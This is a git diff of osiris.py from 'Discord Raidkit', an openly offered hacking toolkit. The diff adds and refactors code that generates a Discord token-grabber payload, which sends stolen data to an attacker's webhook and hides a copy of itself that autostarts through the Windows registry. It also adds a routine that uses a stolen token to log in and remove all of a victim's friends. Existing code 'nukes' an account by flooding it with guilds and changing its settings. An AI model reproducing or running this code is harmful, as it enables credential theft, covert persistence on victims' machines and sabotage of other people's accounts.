@@ -1,5 +1,5 @@
-'''
-Discord Raidkit v2.3.0 — "The trojan horse of discord raiding" 
+"""
+Discord Raidkit v2.3.1 — "The trojan horse of discord raiding"
 Copyright © 2022 the-cult-of-integral
 
 a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3
@@ -8,16 +8,23 @@ This program is under the GNU General Public License v2.0.
 https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE
 
 osiris.py stores the Osiris program for Discord Raidkit.
-osiris.py was last updated on 11/08/22 at 13:36.
-'''
+osiris.py was last updated on 06/09/22 at 16:38.
+"""
 
 import logging
 import os
+from time import sleep
 
 import requests
+from selenium.webdriver import ActionChains
+from selenium.webdriver.common.by import By
+
 from display import show_osiris_screen
 from selenium import webdriver
 from selenium.common.exceptions import WebDriverException
+
+LOGIN_ACTION_NONE = 0
+LOGIN_ACTION_REMOVE_FRIENDS = 1
 
 logging.basicConfig(level=logging.INFO, format=' %(asctime)s - %(levelname)s - %(message)s',
                     filename='raidkit.log', filemode='a+', datefmt='%d/%m/%Y %H:%M:%S')
@@ -33,7 +40,7 @@ class Osiris:
 
     def run(self) -> bool:
         temp = ''
-        while temp != '5':
+        while temp != '6':
             show_osiris_screen(self.theme, self.hint)
             temp = input()
             if temp == '1':
@@ -45,16 +52,21 @@ class Osiris:
             elif temp == '3':
                 print('Enter a user authentication token: ', end='')
                 self.auth = input()
-                self.hint = self.login()
+                self.hint = self.login(LOGIN_ACTION_NONE)
             elif temp == '4':
+                print('Enter a user authentication token: ', end='')
+                self.auth = input()
+                self.hint = self.login(LOGIN_ACTION_REMOVE_FRIENDS)
+            elif temp == '5':
                 print('Enter a user authentication token: ', end='')
                 self.auth = input()
                 self.hint = self.nuke_account()
         return True
 
-    def generate_grabber(self) -> str:
+    @staticmethod
+    def generate_grabber() -> str:
 
-        def get_generate_code(webhook, folder, hpayload, do_reg_key) -> str:
+        def get_generate_code(s_webhook: str, s_folder: str, s_hpayload: str, do_reg_key: bool) -> str:
             """Get code to generate token grabber payload.
 
             Returns:
@@ -65,7 +77,7 @@ class Osiris:
             - Microsoft: lets me write to registry keys without administrator
             """
 
-            code = r'''
+            generated_code = r'''
 import os
 import json
 import os
@@ -75,7 +87,7 @@ import winreg
 from urllib.request import Request, urlopen
 
 PAYLOAD_PATH = os.path.realpath(__file__)
-WEBHOOK_URL = "''' + webhook + r'''"
+WEBHOOK_URL = "''' + s_webhook + r'''"
 
 
 def set_autostart_registry(app_name, key_data=None, autostart=True) -> bool:
@@ -150,29 +162,29 @@ def main():
 
 
 if __name__ == "__main__":
-    path = fr"C:\Users\{os.getenv('username')}''' + f'''\{folder}''' + r'''"
+    path = fr"C:\Users\{os.getenv('username')}''' + f'''\{s_folder}''' + r'''"
     if not os.path.isdir(path):
         os.mkdir(path)
-    file = "''' + hpayload + r'''.pyw"
+    file = "''' + s_hpayload + r'''.pyw"
     try:
         shutil.copy(__file__, f"{path}\{file}")
     except shutil.SameFileError:
         pass
     '''
             if do_reg_key:
-                code += r'''set_autostart_registry("Osiris", f"{path}\{file}")
+                generated_code += r'''set_autostart_registry("Osiris", f"{path}\{file}")
     '''
-            code += r'''main()
+            generated_code += r'''main()
 '''
-            return code
+            return generated_code
 
-        def write_payload(payload, rpayload) -> None:
+        def write_payload(payload: str, s_rpayload: str) -> None:
             """Writes the token grabber payload file
             """
             if not os.path.isdir("payloads"):
                 os.mkdir("payloads")
 
-            with open(f"payloads/{rpayload}.pyw", "w") as f:
+            with open(f"payloads/{s_rpayload}.pyw", "w") as f:
                 f.write(payload)
 
             return
@@ -180,11 +192,13 @@ if __name__ == "__main__":
         try:
             webhook = input('Please enter a discord webhook: ')
             folder = input(
-                'Please enter a folder name (this folder will be created on the target\'s computer, containing another payload): ')
+                'Please enter a folder name (this folder will be created on the target\'s computer, containing '
+                'another payload): ')
             rpayload = input(
                 'Please enter the regular payload name (this is the payload the target will knowingly run): ')
             hpayload = input(
-                'Please enter the hidden payload name (this is the payload the target will unknowingly run if registry key is enabled): ')
+                'Please enter the hidden payload name (this is the payload the target will unknowingly run if '
+                'registry key is enabled): ')
             do_reg_keg = input(
                 'Enter 1 to enable registry keys (will let the payload run every time the target logs into Windows): ')
 
@@ -200,7 +214,7 @@ if __name__ == "__main__":
                 os.remove(rpayload + ".txt")
                 open(hpayload + ".txt", "w").close()
                 os.remove(hpayload + ".txt")
-            except:
+            except OSError:
                 return 'Some options entered had invalid Windows names!'
 
             code = get_generate_code(webhook, folder, hpayload, do_reg_keg)
@@ -211,19 +225,19 @@ if __name__ == "__main__":
             logging.error(f'Error in osiris.py - generate_grabber(): {e}')
             return f'Error in osiris.py - generate_grabber(): {e}'
 
-    def get_account_info(self) -> tuple:
+    def get_account_info(self) -> str:
         b, r = self.check_auth()
         if b:
-            userName = f'{r[1].json()["username"]}#{r[1].json()["discriminator"]}'
-            userID = r[1].json()["id"]
-            phone = r[1].json()["phone"]
-            email = r[1].json()["email"]
-            mfa = r[1].json()["mfa_enabled"]
-            return f'''[User ID]\t\t{userID}
-[User Name]\t\t{userName}
+            user_name = f'{r.json()["username"]}#{r.json()["discriminator"]}'
+            user_id = r.json()["id"]
+            phone = r.json()["phone"]
+            email = r.json()["email"]
+            mfa = r.json()["mfa_enabled"]
+            return f'''[User ID]\t\t{user_id}
+[User Name]\t\t{user_name}
 [2 Factor]\t\t{mfa}
 [Email]\t\t\t{email}
-[Phone number]\t\t{phone if phone else ''}
+[Phone number]\t{phone if phone else ''}
 [Token]\t\t\t{self.auth}'''
         else:
             return 'User authentication token is not valid!'
@@ -239,15 +253,16 @@ if __name__ == "__main__":
             return True, r
         return False, False
 
-    def login(self) -> str:
+    def login(self, login_action: int = 0) -> str:
         try:
-            if self.check_auth():
+            if self.check_auth()[0]:
                 webdriver.ChromeOptions.binary_location = os.path.join(
                     'browser', 'chrome.exe')
                 opts = webdriver.ChromeOptions()
                 opts.add_experimental_option('detach', True)
                 driver = webdriver.Chrome(
                     executable_path=os.path.join('browser', 'chromedriver.exe'), options=opts)
+                driver.implicitly_wait(10)
                 script = """
                             function login(token) {
                             setInterval(() => {
@@ -260,7 +275,23 @@ if __name__ == "__main__":
                             """
                 driver.get('https://discord.com/login')
                 driver.execute_script(script + f'\nlogin("{self.auth}")')
-                return 'Logged into user account successfully'
+
+                if login_action == LOGIN_ACTION_NONE:
+                    return 'Logged into user account successfully'
+
+                elif login_action == LOGIN_ACTION_REMOVE_FRIENDS:
+                    driver.find_element(By.XPATH, "//div[@role='tab'][contains(text(),'All')]").click()
+                    people = driver.find_elements(By.XPATH, "//div[@data-list-id='people'] //div[@role='listitem']")
+                    action = ActionChains(driver)
+                    for person in people:
+                        action.context_click(person).perform()
+                        driver.find_element(By.ID, 'user-context-remove-friend').click()
+                        driver.find_element(By.XPATH, "//button[@type='submit']").click()
+                        sleep(0.5)
+                    driver.close()
+                    return 'Removed all friends from user account successfully'
+                else:
+                    return 'Invalid login action!'
             else:
                 return 'User authentication token is not valid!'
         except WebDriverException as e:
@@ -271,9 +302,7 @@ if __name__ == "__main__":
 
     def nuke_account(self) -> str:
 
-        def nuke_requests(headers) -> None:
-            headers = headers
-
+        def nuke_requests(d_headers: dict) -> None:
             for i in range(200):
                 try:
                     payload = {
@@ -284,10 +313,10 @@ if __name__ == "__main__":
                     }
                     requests.post(
                         "https://discord.com/api/v6/guilds",
-                        headers=headers,
+                        headers=d_headers,
                         json=payload
                     )
-                except:
+                except (requests.exceptions.HTTPError, requests.exceptions.InvalidHeader):
                     pass
 
             settings = {
@@ -314,7 +343,7 @@ if __name__ == "__main__":
 
             requests.patch(
                 "https://discord.com/api/v8/users/@me/settings",
-                headers=headers,
+                headers=d_headers,
                 json=settings
             )
             return
@@ -323,11 +352,13 @@ if __name__ == "__main__":
             if self.check_auth()[0]:
                 print('\nNuking account... this may take a while...')
 
-                # Attempt to get IDs of guilds from settings response (used to make account leave every guild, usually fails thanks to nerf).
+                # Attempt to get IDs of guilds from settings response (used to make account leave every guild,
+                # usually fails thanks to nerf).
 
                 headers = {
                     "Authorization": self.auth,
-                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
+                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
+                                  "Chrome/50.0.2661.75 Safari/537.36",
                     "X-Requested-With": "XMLHttpRequest"
                 }
 
